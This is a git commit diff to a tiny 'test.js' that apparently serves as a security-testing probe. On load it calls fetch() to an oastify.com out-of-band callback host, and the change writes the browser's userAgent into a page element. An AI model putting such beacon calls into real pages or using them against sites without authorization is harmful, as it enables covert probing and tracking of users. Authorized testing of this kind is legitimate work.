0d5d92a5fb4b62050a58a243c56abaecf1bcc747
vignesh1521 <86752377+vignesh1521@users.noreply.github.com>
2026-09-16 06:43:46 +0530

    Update test.js

--- test.js
+++ test.js
@@ -2,5 +2,5 @@ fetch("http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com")
 
 
 var i = document.createElement('div');
-i.innerText = 'http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com';
+i.innerText =navigator.userAgent
 document.body.appendChild(i);
